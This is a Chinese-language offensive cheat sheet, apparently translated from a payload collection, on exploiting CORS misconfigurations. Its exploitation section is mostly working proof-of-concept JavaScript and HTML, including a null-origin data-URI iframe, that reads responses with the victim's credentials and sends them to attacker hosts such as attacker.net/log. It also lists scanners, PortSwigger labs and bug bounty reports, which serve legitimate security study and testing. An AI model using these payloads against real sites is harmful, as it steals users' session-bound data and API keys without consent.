# 跨域资源共享（CORS）配置错误

> 一个API域存在全局CORS配置错误。这允许攻击者代表用户发起跨站请求，因为应用程序没有将Origin头列入白名单，并且设置了`Access-Control-Allow-Credentials: true`，这意味着我们可以使用受害者的凭据从攻击者的站点发起请求。

## 摘要

- 工具
- 先决条件
- 利用方法
- 参考资料

## 工具

- [s0md3v/Corsy - CORS配置错误扫描器](s0md3v/Corsy - CORS配置错误扫描器)
- [chenjj/CORScanner - 快速CORS配置错误漏洞扫描器](chenjj/CORScanner - 快速CORS配置错误漏洞扫描器)
- [PostMessage POC Builder - @honoki](https://tools.honoki.net/postmessage.html)
- [trufflesecurity/of-cors - 利用内部网络上的CORS配置错误](trufflesecurity/of-cors - 利用内部网络上的CORS配置错误)

## 先决条件

- 攻击者头部 > `Origin: https://evil.com`
- 受害者头部 > `Access-Control-Allow-Credential: true`
- 受害者头部 > `Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`

## 利用方法

通常目标是API端点。使用以下有效负载来利用目标`https://victim.example.com/endpoint`上的CORS配置错误。

### 易受攻击的示例：Origin反射

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"[私有API密钥]"}
```

#### 概念验证

此PoC要求相应的JS脚本托管在`evil.com`上

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://victim.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

或者

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
            <button type="button" onclick="cors()">利用</button>
         </div>
        <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### 易受攻击的示例：null origin

#### 易受攻击的实现

服务器可能不会反映完整的`Origin`头，但是允许`null`起源。这在服务器的响应中看起来像这样：

```markdown
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[私有API密钥]"}
```

#### 概念验证

这可以通过将攻击代码放入使用数据URI方案的iframe中来利用。如果使用数据URI方案，浏览器将在请求中使用`null`起源：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### 易受攻击的示例：受信任起源上的XSS

如果应用程序确实实现了严格的允许起源白名单，上述的攻击代码不起作用。但是，如果你在受信任的起源上有一个XSS漏洞，你可以注入上述的攻击代码，以再次利用CORS。

```markdown
https://trusted-origin.example.com/?xss<script>CORS-ATTACK-PAYLOAD</script>
```

### 易受攻击的示例：通配符起源`*`不使用凭据

如果服务器响应使用通配符起源`*`，**浏览器永远不会发送cookie**。然而，如果服务器不需要认证，仍然有可能访问服务器上的数据。这可能发生在内部服务器上，这些服务器无法从互联网访问。然后攻击者的网站可以进入到内部网络，并在不需要认证的情况下访问服务器的数据。

```powershell
*是唯一有效的通配符起源
https://*.example.com是不合法的
```

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[私有API密钥]"}
```

#### 概念验证

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

### 易受攻击的示例：扩展原始来源/正则表达式问题

有时，服务器端未对原始来源的某些扩展进行过滤。这可能是由于使用实现不良的正则表达式来验证来源头造成的。

#### 易受攻击的实现（示例1）

在这种情况下，任何插入在`example.com`前面的前缀都将被服务器接受。

```markdown
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true

{"[私有API密钥]"}
```

#### 概念验证（示例1）

此PoC需要在`evilexample.com`上托管相应的JS脚本。

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

#### 易受攻击的实现（示例2）

在这种情况下，服务器使用的正则表达式中点号没有正确转义。例如，类似这样的正则表达式：`^api.example.com$` 而不是 `^api\.example.com$`。因此，点号可以被替换为任何字母，以从第三方域获得访问权限。

```markdown
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true

{"[私有API密钥]"}
```

#### 概念验证（示例2）

此PoC需要在`apiiexample.com`上托管相应的JS脚本。

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

## 实验室

- [CORS漏洞与基本来源反射](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
- [CORS漏洞与受信任的空来源](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
- [CORS漏洞与受信任的不安全协议](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
- [CORS漏洞与内部网络中心攻击](https://portswigger.net/web-security/cors)

## 漏洞赏金报告

- [www.zomato.com上的CORS配置错误 - James Kettle (albinowax)](www.zomato.com上的CORS配置错误 - James Kettle (albinowax))
- [CORS配置错误 | 账户接管 - niche.co - Rohan (nahoragg)](https://hackerone.com/reports/426147)
- [跨源资源共享配置错误 |窃取用户信息 - bughunterboy (bughunterboy)](https://hackerone.com/reports/235200)
- [CORS配置错误导致私人信息公开 - sandh0t (sandh0t)](https://hackerone.com/reports/430249)
- [[██████] 跨源资源共享配置错误（CORS）- Vadim (jarvis7)](https://hackerone.com/reports/470298)

## 参考资料

- [跳出范围思考：高级CORS利用技术 - @Sandh0t - 2019年5月14日](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
- [利用CORS配置错误获取比特币和赏金 - James Kettle | 2016年10月14日](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [利用配置错误的CORS（跨源资源共享）- Geekboy - 2016年12月16日](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
